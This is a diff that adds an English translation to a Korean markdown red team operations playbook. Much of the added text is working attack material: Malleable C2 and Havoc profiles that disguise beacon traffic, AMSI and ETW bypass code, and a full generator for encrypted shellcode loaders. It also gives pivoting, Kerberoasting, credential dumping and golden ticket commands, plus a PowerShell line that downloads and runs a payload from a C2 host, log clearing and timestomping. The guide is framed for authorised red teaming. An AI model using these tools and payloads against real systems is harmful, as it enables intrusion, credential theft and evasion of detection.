@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 레드팀 운영 플레이북
 
 ## 레드팀 vs 펜테스트
@@ -835,4 +841,846 @@ powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('htt
 wevtutil cl Security
 # Linux
 > /var/log/auth.log    # 파일 내용 비우기 (삭제보다 덜 눈에 띔)
+```
+
+---
+
+<a name="english"></a>
+
+# Red Team Operations Playbook
+
+## Red Team vs Penetration Testing
+
+```
+Penetration Testing (Pentest)      Red Team
+─────────────────────────────────────────────────
+Scope: Specific systems/apps        Scope: Entire organization
+Duration: Days to weeks             Duration: Weeks to months
+Goal: Find vulnerabilities          Goal: Evade detection + achieve objectives
+Notification: Most security staff aware  Notification: Only a handful aware (White Cell)
+Metric: Vulnerability count         Metric: Objective achievement
+Team: Cooperates with security team Team: Independent operation
+```
+
+---
+
+## 1. Red Team Operational Structure
+
+### Team Composition
+
+```
+Red Team Lead
+  │
+  ├── Technical Operator
+  │     - Initial access / exploitation
+  │     - Lateral movement
+  │     
+  ├── C2 Operator
+  │     - Cobalt Strike / Havoc server administration
+  │     - Beacon management
+  │
+  └── Intelligence Analyst
+        - OSINT
+        - Target profiling
+        - Social engineering planning
+
+White Cell:
+  - Rules of engagement enforcement
+  - Emergency stop authority
+  - Blue team arbitration
+```
+
+### Operational Phases
+
+```
+1. Planning
+   - Define objectives (flags)
+   - Establish Rules of Engagement (RoE)
+   - OSINT reconnaissance
+
+2. Initial Access
+   - Phishing campaigns
+   - Exploitation of public-facing vulnerabilities
+   - Physical access
+
+3. Execution
+   - Payload execution
+   - Process injection
+
+4. Persistence
+   - Auto-start mechanisms
+   - Account creation
+
+5. Privilege Escalation
+   - Local → Domain Administrator
+
+6. Defense Evasion
+   - AV/EDR bypass
+   - Log deletion
+
+7. Credential Access
+   - Mimikatz
+   - Kerberoasting
+
+8. Discovery
+   - Internal network mapping
+   - Sensitive data enumeration
+
+9. Collection
+   - Data compression
+   - Staging
+
+10. Objective Achievement (Impact/Exfiltration)
+    - Data exfiltration
+    - Business system access
+```
+
+---
+
+## 2. Cobalt Strike Core Operations
+
+### Team Server Setup
+
+Cobalt Strike is a professional red team simulation tool that remotely controls target systems via its Beacon C2 agent. It disguises C2 communications over various channels — HTTP, HTTPS, DNS — and is used for realistic APT attack simulation.
+
+```bash
+# Start Cobalt Strike team server
+./teamserver SERVER_IP STRONG_PASSWORD malleable_profile.c2
+
+# Connect client
+./cobaltstrike
+# → Enter team server IP and password
+
+# Malleable C2 profile (detection evasion)
+# C2 traffic disguised as a GET request
+```
+
+### Writing a Malleable C2 Profile
+
+```
+# jquery.c2 - disguised as jQuery
+http-get {
+    set uri "/jquery-3.3.1.min.js";
+    
+    client {
+        header "Host" "cdn.jquery.com";
+        header "Accept" "text/javascript";
+        header "Referer" "https://www.google.com/";
+        
+        metadata {
+            base64url;
+            prepend "__cfduid=";
+            header "Cookie";
+        }
+    }
+    
+    server {
+        header "Content-Type" "text/javascript; charset=utf-8";
+        header "Cache-Control" "max-age=3600";
+        header "Server" "cloudflare";
+        
+        output {
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/jquery-3.3.1.min.js";
+    
+    client {
+        header "Host" "cdn.jquery.com";
+        header "Content-Type" "application/javascript";
+        
+        id {
+            base64url;
+            append ".min.js";
+            uri-append;
+        }
+        
+        output {
+            base64url;
+            print;
+        }
+    }
+    
+    server {
+        header "Content-Type" "text/javascript";
+        output { print; }
+    }
+}
+
+# Beacon sleep settings (detection avoidance)
+set sleeptime "60000";      # 60-second default sleep
+set jitter "20";             # 20% random jitter
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+```
+
+### Core Cobalt Strike Commands
+
+Core commands for the Cobalt Strike C2 framework. Supports all phases of red team operations: beacon management, lateral movement, credential collection, and more.
+
+```bash
+# Beacon management
+beacon> help                    # Help
+beacon> sleep 0                 # Immediate response (aggressive)
+beacon> sleep 300 20            # 5-minute sleep + 20% jitter (stealthy)
+
+# Reconnaissance
+beacon> whoami                  # Current user
+beacon> getuid                  # Current user ID
+beacon> ps                      # Process list
+beacon> net computers           # Domain computers
+beacon> net localgroup          # Local groups
+beacon> net user /domain        # Domain users
+
+# Credentials
+beacon> logonpasswords          # Mimikatz logonpasswords
+beacon> dcsync DOMAIN\ACCOUNT   # DC Sync (requires admin)
+beacon> kerberos_ticket_use /tmp/ticket.kirbi  # Use ticket
+
+# Lateral movement
+beacon> jump psexec TARGET LISTENER
+beacon> jump winrm TARGET LISTENER
+beacon> remote-exec wmi TARGET cmd /c whoami
+
+# Privilege escalation
+beacon> getsystem              # Attempt local privilege escalation
+beacon> runasadmin             # UAC bypass
+
+# Data collection
+beacon> download C:\sensitive\file.txt
+beacon> screenshot              # Screenshot
+beacon> keylogger               # Keylogger
+beacon> browserpivot PID        # Browser pivot
+
+# Pivoting
+beacon> socks 1080              # SOCKS4 proxy
+beacon> socks5 1080 socks_user pass  # SOCKS5
+beacon> covertvpn               # VPN pivot
+```
+
+---
+
+## 3. Havoc C2 Framework (Open Source)
+
+Havoc is an open-source C2 framework. It is an open-source alternative to Cobalt Strike that provides encrypted communications between the team server and agents.
+
+```bash
+# Install Havoc
+git clone https://github.com/HavocFramework/Havoc
+cd Havoc
+make ts-build   # Build team server
+make client-build  # Build client
+
+# Start team server
+./havoc server --profile ./profiles/havoc.yaotl
+
+# Example YAOTL profile
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+    Build {
+        Compiler64 = "x86_64-w64-mingw32-gcc"
+    }
+}
+
+Operators {
+    operator "operator1" {
+        Password = "StrongPass123!"
+    }
+}
+
+Listeners {
+    Http {
+        Name = "https80"
+        Hosts = ["attacker.com"]
+        Port = 443
+        Ssl = true
+        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        Uris = ["/jquery.min.js", "/bootstrap.css"]
+    }
+}
+```
+
+---
+
+## 4. AV/EDR Bypass Techniques
+
+### AMSI (Anti-Malware Scan Interface) Bypass
+
+Techniques for bypassing AMSI. PowerShell scripts are scanned by AMSI before execution; this approach patches AMSI via Reflection to bypass the scan.
+
+```powershell
+# AMSI patch (Reflection-based)
+$a=[Ref].Assembly.GetTypes()
+foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
+$d=$c.GetFields('NonPublic,Static')
+foreach($e in $d){if($e.Name -like "*Context"){$f=$e}}
+$g=$f.GetValue($null)
+[IntPtr]$ptr=$g
+[Int32[]]$buf=@(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+
+# AMSI bypass - force error
+[Runtime.InteropServices.Marshal]::WriteByte(
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
+        'amsiInitFailed','NonPublic,Static').GetValue($null), 1
+)
+```
+
+### ETW (Event Tracing for Windows) Bypass
+
+Code to disable ETW. Because ETW records process activity, malware attempts to disable it to evade detection.
+
+```csharp
+// Disable ETW (within process)
+using System.Runtime.InteropServices;
+
+[DllImport("ntdll.dll")]
+static extern int NtSetInformationProcess(
+    IntPtr ProcessHandle, 
+    int ProcessInformationClass,
+    ref int ProcessInformation, 
+    int ProcessInformationLength);
+
+// Disable ETW
+int flag = 0;
+NtSetInformationProcess(
+    (IntPtr)(-1),   // Current process
+    0x1D,           // ProcessDisableUserModeCallbackFilter
+    ref flag, 
+    sizeof(int));
+```
+
+### Process Injection Techniques
+
+Classic process injection technique. Allocates memory in a remote process with VirtualAllocEx and injects shellcode via WriteProcessMemory.
+
+```csharp
+// Classic: VirtualAllocEx + WriteProcessMemory
+// → Detected
+
+// Improved: Process Hollowing
+// 1. Create a legitimate process in a suspended state
+// 2. Unmap memory
+// 3. Map malicious code
+// 4. Resume
+
+// Further improved: Thread Hijacking (using existing threads)
+// 1. OpenThread
+// 2. SuspendThread
+// 3. GetThreadContext
+// 4. VirtualAllocEx + Write shellcode
+// 5. SetThreadContext (modify RIP/EIP)
+// 6. ResumeThread
+
+// Modern: Direct Syscall (bypasses API hooking)
+// Calls syscall numbers directly, avoiding NTDLL hooks
+```
+
+### Shellcode Obfuscation
+
+Obfuscate shellcode to evade AV/EDR detection. XOR encryption, Base64 encoding, and custom encoding schemes are used to bypass signature-based detection.
+
+```python
+#!/usr/bin/env python3
+"""
+Shellcode encryption and C#/Python loader generation CLI (uses AES-256-GCM)
+Usage: python3 shellcode_encrypt.py encrypt --input shellcode.bin --output loader.cs --lang csharp
+       python3 shellcode_encrypt.py encrypt --input shellcode.bin --output loader.py  --lang python
+       python3 shellcode_encrypt.py encrypt --input shellcode.bin --hex-only
+"""
+
+from __future__ import annotations
+import argparse
+import os
+import sys
+from pathlib import Path
+
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    print("[-] pycryptodome required: pip install pycryptodome", file=sys.stderr)
+    sys.exit(1)
+
+
+def encrypt_shellcode_gcm(shellcode: bytes) -> tuple[bytes, bytes, bytes, bytes]:
+    """
+    Encrypt shellcode with AES-256-GCM (AEAD — includes integrity verification)
+    Returns: (key, nonce, ciphertext, tag)
+    """
+    key   = os.urandom(32)   # 256-bit
+    nonce = os.urandom(12)   # 96-bit recommended for GCM
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    ciphertext, tag = cipher.encrypt_and_digest(shellcode)
+    return key, nonce, ciphertext, tag
+
+
+def hex_array(data: bytes, var: str, indent: int = 8) -> str:
+    pad = " " * indent
+    hex_vals = ", ".join(f"0x{b:02x}" for b in data)
+    return f"{pad}byte[] {var} = {{ {hex_vals} }};"
+
+
+def generate_csharp_loader(key: bytes, nonce: bytes,
+                            ct: bytes, tag: bytes) -> str:
+    """AES-256-GCM C# loader — uses BouncyCastle or built-in .NET AesGcm"""
+    return f"""\
+using System;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+
+// Build: csc /optimize+ /unsafe loader.cs
+class Loader {{
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f,
+        IntPtr p, uint c, IntPtr id);
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+    static void Main() {{
+{hex_array(key,   "key")}
+{hex_array(nonce, "nonce")}
+{hex_array(ct,    "ciphertext")}
+{hex_array(tag,   "tag")}
+
+        byte[] shellcode = new byte[ciphertext.Length];
+
+        // AES-256-GCM decrypt + authenticate (.NET 5+)
+        using (var gcm = new AesGcm(key, 16)) {{
+            gcm.Decrypt(nonce, ciphertext, tag, shellcode);
+        }}
+
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
+            0x3000, 0x40);  // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
+        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+        var t = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(t, 0xFFFFFFFF);
+    }}
+}}
+"""
+
+
+def generate_python_loader(key: bytes, nonce: bytes,
+                            ct: bytes, tag: bytes) -> str:
+    """AES-256-GCM Python loader (ctypes-based, Windows only)"""
+    return f"""\
+#!/usr/bin/env python3
+\"\"\"AES-256-GCM Python shellcode loader — Windows only (ctypes)\"\"\"
+import ctypes, sys
+
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    sys.exit("pip install pycryptodome")
+
+KEY   = bytes.fromhex("{key.hex()}")
+NONCE = bytes.fromhex("{nonce.hex()}")
+CT    = bytes.fromhex("{ct.hex()}")
+TAG   = bytes.fromhex("{tag.hex()}")
+
+cipher = AES.new(KEY, AES.MODE_GCM, nonce=NONCE)
+shellcode = cipher.decrypt_and_verify(CT, TAG)
+
+MEM_COMMIT  = 0x1000
+MEM_RESERVE = 0x2000
+PAGE_EXEC_RW = 0x40
+
+k32 = ctypes.windll.kernel32
+addr = k32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXEC_RW)
+ctypes.memmove(addr, shellcode, len(shellcode))
+h = k32.CreateThread(None, 0, addr, None, 0, None)
+k32.WaitForSingleObject(h, -1)
+"""
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Shellcode encryption loader generator")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    enc = sub.add_parser("encrypt", help="Encrypt shellcode and generate loader")
+    enc.add_argument("--input",  type=Path, required=True, help="Shellcode binary")
+    enc.add_argument("--output", type=Path, help="Output file")
+    enc.add_argument("--lang",   choices=["csharp", "python"], default="csharp")
+    enc.add_argument("--hex-only", action="store_true",
+                     help="Print only key/nonce/ct/tag without generating loader")
+
+    args = parser.parse_args()
+
+    if args.cmd == "encrypt":
+        raw = args.input.read_bytes()
+        key, nonce, ct, tag = encrypt_shellcode_gcm(raw)
+        print(f"[*] shellcode: {len(raw)} bytes → {len(ct)} bytes (encrypted)")
+        print(f"    key   : {key.hex()}")
+        print(f"    nonce : {nonce.hex()}")
+        print(f"    tag   : {tag.hex()}")
+
+        if args.hex_only:
+            return
+
+        if args.lang == "csharp":
+            code = generate_csharp_loader(key, nonce, ct, tag)
+        else:
+            code = generate_python_loader(key, nonce, ct, tag)
+
+        if args.output:
+            args.output.write_text(code)
+            print(f"[+] Loader saved: {args.output}")
+        else:
+            print(code)
+
+
+if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        # Demo: encrypt NOP sled
+        dummy = b"\x90" * 64 + b"\xcc"   # NOP sled + INT3
+        k, n, c, t = encrypt_shellcode_gcm(dummy)
+        print(f"[Demo] {len(dummy)}B shellcode encrypted")
+        print(f"  key={k.hex()}\n  nonce={n.hex()}\n  tag={t.hex()}")
+    else:
+        main()
+```
+
+---
+
+## 5. Internal Network Pivoting
+
+### Pivoting via SOCKS Proxy
+
+Uses the chisel tool to set up a SOCKS proxy tunnel for pivoting. Used to access non-public services on internal networks from the outside.
+
+```bash
+# ── chisel SOCKS tunnel ──────────────────────────────────────
+# Attacker server (reverse SOCKS5)
+./chisel server -p 8080 --reverse --socks5
+
+# Victim system (agent)
+./chisel client ATTACKER_IP:8080 R:1080:socks
+
+# proxychains configuration
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+proxychains nmap -sT -Pn -p 22,80,443,445,3389 192.168.10.0/24
+
+# ── Impacket internal network reconnaissance (via proxychains) ──────────────
+# Enumerate domain users
+proxychains impacket-GetADUsers -all DOMAIN/USER:PASS -dc-ip 192.168.10.1
+
+# Kerberoasting (collect SPN service account hashes)
+proxychains impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip 192.168.10.1 \
+    -request -outputfile kerberoast.txt
+
+# Crack TGS hashes with hashcat
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
+        -r /usr/share/hashcat/rules/best64.rule
+
+# AS-REP Roasting (accounts with pre-authentication disabled)
+proxychains impacket-GetNPUsers DOMAIN/ -usersfile users.txt \
+    -format hashcat -outputfile asrep.txt -dc-ip 192.168.10.1
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+# secretsdump — remote credential dump
+proxychains impacket-secretsdump DOMAIN/Administrator:PASS@192.168.10.5
+# Pass-the-Hash method
+proxychains impacket-secretsdump -hashes ':NTLM_HASH' \
+    DOMAIN/Administrator@192.168.10.5
+
+# PSExec — obtain admin shell
+proxychains impacket-psexec -hashes ':NTLM_HASH' \
+    DOMAIN/Administrator@192.168.10.5 cmd.exe
+
+# WMI remote execution
+proxychains impacket-wmiexec -hashes ':NTLM_HASH' \
+    DOMAIN/Administrator@192.168.10.5 'whoami /all'
+
+# ── Ligolo-ng (high-performance pivot) ────────────────────────────────
+# Attacker (proxy server)
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Victim (agent)
+./agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# Start tunnel from attacker proxy
+ligolo-ng >> session                    # Select session
+ligolo-ng >> tunnel_start --tun ligolo  # Activate tunnel
+# Add route
+sudo ip route add 192.168.10.0/24 dev ligolo
+```
+
+### Double Pivot (Two-Hop Intermediate Systems)
+
+A multi-hop pivoting technique that routes through two intermediate systems. Used to access isolated internal segments or to make the attack path harder to trace.
+
+```bash
+# Internet → Edge Server → Internal Server → Isolated Server
+# Attacker → Pivot1 → Pivot2 → Target
+
+# Step 1: Access Pivot1
+ssh user@EDGE_SERVER
+
+# Step 2: Tunnel from Pivot1 to Pivot2
+# On Pivot1:
+ssh -L 2222:INTERNAL_SERVER:22 -N user@INTERNAL_SERVER &
+ssh -D 1080 -N -p 2222 user@127.0.0.1
+
+# From attacker:
+proxychains nmap -sT INTERNAL_NETWORK/24
+```
+
+---
+
+## 6. Domain Persistence
+
+### Golden Ticket
+
+Generate a Golden Ticket using the krbtgt account hash to access all services within the domain. Used for persistence after achieving full domain controller compromise.
+
+```bash
+# 1. Obtain krbtgt hash
+mimikatz# lsadump::dcsync /user:krbtgt /domain:company.local
+# → NTLM Hash: aabbcc...
+
+# 2. Create Golden Ticket
+mimikatz# kerberos::golden \
+    /domain:company.local \
+    /sid:S-1-5-21-XXXXXXXXXX \
+    /krbtgt:KRBTGT_NTLM_HASH \
+    /user:Administrator \
+    /groups:512,513,518,519,520 \
+    /ticket:golden.kirbi
+
+# 3. Use the ticket
+mimikatz# kerberos::ptt golden.kirbi
+
+# Or Pass-the-Ticket
+Rubeus.exe ptt /ticket:golden.kirbi
+
+# Access all services in the domain with the Golden Ticket
+klist  # Verify ticket
+dir \\DC01\C$  # Access DC file system
+```
+
+### Diamond Ticket (Improved Detection Evasion)
+
+Diamond tickets modify a legitimate TGT, making them harder to detect than Golden Tickets. They are based on a normal Kerberos exchange, which helps bypass anomaly detection.
+
+```bash
+# Create Rubeus Diamond Ticket (legitimate TGT + modification)
+Rubeus.exe diamond \
+    /tgtdeleg \
+    /ticketuser:user@company.com \
+    /ticketuserid:1234 \
+    /groups:512 \
+    /krbkey:AES256_KEY \
+    /nowrap
+```
+
+---
+
+## 7. MITRE ATT&CK Framework Mapping
+
+### ATT&CK Matrix Overview
+```
+Tactic → Technique → Procedure
+
+14 Primary Tactics:
+  TA0043 Reconnaissance
+  TA0042 Resource Development
+  TA0001 Initial Access
+  TA0002 Execution
+  TA0003 Persistence
+  TA0004 Privilege Escalation
+  TA0005 Defense Evasion
+  TA0006 Credential Access
+  TA0007 Discovery
+  TA0008 Lateral Movement
+  TA0009 Collection
+  TA0011 Command and Control
+  TA0010 Exfiltration
+  TA0040 Impact
+```
+
+### Red Team Operation ATT&CK Mapping Example
+```
+Initial Access (T1566 Phishing)
+  └─→ Execution (T1059 Command and Script Interpreter)
+        └─→ Persistence (T1053 Scheduled Task/Job)
+              └─→ Privilege Escalation (T1055 Process Injection)
+                    └─→ Credential Access (T1003 OS Credential Dumping)
+                          └─→ Lateral Movement (T1550 Pass the Hash)
+                                └─→ Exfiltration (T1048 Exfiltration Over Alternative Protocol)
+```
+
+### Detection Evasion Strategies by Key Technique
+
+Detection evasion strategies mapped to MITRE ATT&CK techniques. Covers bypass methods for major attack techniques including PowerShell, WMI, and services.
+
+```bash
+# T1059.001 PowerShell detection bypass
+# Execute after AMSI bypass + ETW disable
+powershell -w hidden -ep bypass -enc <BASE64>
+
+# T1003.001 LSASS dump detection bypass
+# Use VSS instead of direct LSASS access
+# Or call NtReadVirtualMemory directly instead of MiniDumpWriteDump API
+
+# T1070.001 Event log deletion detection
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+# Note: log deletion itself is recorded as Event ID 1102 — be aware
+
+# T1027 Obfuscation
+# Bypass static analysis via encoding, encryption, packing
+```
+
+---
+
+## 8. Red Team Report Structure
+
+The structure for the final report communicating red team operation results. Includes executive summary, technical findings, risk assessment, and improvement recommendations.
+
+```markdown
+# Red Team Final Report
+
+## Executive Summary
+- Operation period: 2024-01-15 to 2024-02-15
+- Objectives achieved: 3/5 (60%)
+- Detection evasion: Blue team did not detect for 14 days
+- Critical risk: Phishing → domain compromise chain
+
+## Objective Achievement Status
+| Objective | Result | Time Required |
+|-----------|--------|--------------|
+| Domain Administrator obtained | ✓ Achieved | 3 days |
+| Finance system access | ✓ Achieved | 7 days |
+| Customer DB access | ✓ Achieved | 10 days |
+| Physical server room access | ✗ Not achieved | - |
+| Executive email access | ✓ Achieved | 12 days |
+
+## Attack Chain
+Initial Access → Privilege Escalation → Lateral Movement → Objective Achievement
+
+## Key Findings
+### Critical
+1. Lack of phishing awareness (click rate 43%)
+2. EDR coverage gaps (3 servers without deployment)
+3. Credential reuse (68% of AD users)
+
+## Blue Team Detection Status
+- Undetected for 14 days
+- First detection: January 29 (EDR alert)
+- Detection trigger: Anomalous LSASS access
+
+## Improvement Recommendations
+Priority 1 (Immediate):
+  - Strengthen phishing training
+  - Deploy EDR to all systems
+  - Apply MFA to privileged accounts
+
+Priority 2 (Within 30 days):
+  - Tiering model (admin / user separation)
+  - Privileged Access Workstations
+  - Enhanced network segmentation
+```
+
+---
+
+## 9. Physical Red Team Techniques
+
+### Social Engineering
+```
+Spear phishing campaign preparation:
+  1. Profile target employees via OSINT
+     - LinkedIn, company website, social media
+  2. Impersonate a trusted sender
+     - Colleagues, partners, IT team
+  3. Craft a contextually appropriate lure
+     - HR announcements, pay stubs, invoices
+  4. Document or link containing payload
+     - Macro-enabled Word/Excel
+     - HTML Smuggling
+     - ISO/ZIP files (MOTW bypass)
+
+Vishing (phone fraud):
+  - Impersonate IT support to request passwords
+  - Create urgency (psychological pressure)
+
+Baiting:
+  - USB drop attacks (parking lots, lobbies)
+  - Auto-executing payload on malicious USB
+```
+
+### Physical Access
+```
+Building infiltration methods:
+  1. Tailgating — following an employee through a secured entrance
+  2. Impersonating a delivery driver or repairperson
+  3. Lock picking
+  4. Card reader cloning (RFID/NFC cards)
+
+After gaining internal access:
+  - Traffic capture via RJ45 tap or Wi-Fi Pineapple
+  - Rapid payload execution with USB Rubber Ducky
+  - LAN Turtle — inline network implant
+```
+
+---
+
+## 10. Red Team Operational Security (OPSEC)
+
+### Infrastructure Configuration
+```
+Red Team Infrastructure (Layered Architecture):
+
+Internet
+  │
+  ├── Redirector
+  │     - Cloud VPS (AWS/Azure/GCP)
+  │     - Hides real C2 IP
+  │     - Apache/Nginx mod_rewrite
+  │
+  └── C2 Server (Team Server)
+        - Accessible only via VPN
+        - No public IP
+        - Logs stored encrypted
+```
+
+### Domain Fronting and CDN Abuse
+
+Domain fronting hides C2 communications behind a CDN. It places a legitimate domain at the front to bypass network detection, though most CDNs now block this technique.
+
+```bash
+# CloudFront domain fronting (mostly blocked now)
+# Alternative: hide C2 behind CDN provider's legitimate domain
+
+# Register domains that appear legitimate
+# - Typosquatting: micosoft.com, googgle.com
+# - Prioritize categorized domains: news, sports, CDN-related
+# - Purchase aged domains (domain age is a trust factor)
+
+# Check domain reputation
+curl "https://www.virustotal.com/vtapi/v2/domain/report?domain=DOMAIN&apikey=API_KEY"
+```
+
+### Minimizing Traces
+
+Methods for cleaning up attack artifacts after an operation. Timestamp manipulation, log deletion, and tool removal make post-operation forensic analysis more difficult.
+
+```bash
+# Timestamp manipulation
+touch -t 202001010000 malicious.exe    # Change timestamp
+touch -r legit.dll malicious.dll       # Copy timestamp from a legitimate file
+
+# Execute only in memory (fileless attack)
+# PowerShell IEX (download and execute in memory)
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"
+
+# Log deletion (carries detection risk)
+# Windows
+wevtutil cl Security
+# Linux
+> /var/log/auth.log    # Clear file contents (less conspicuous than deletion)
 ```
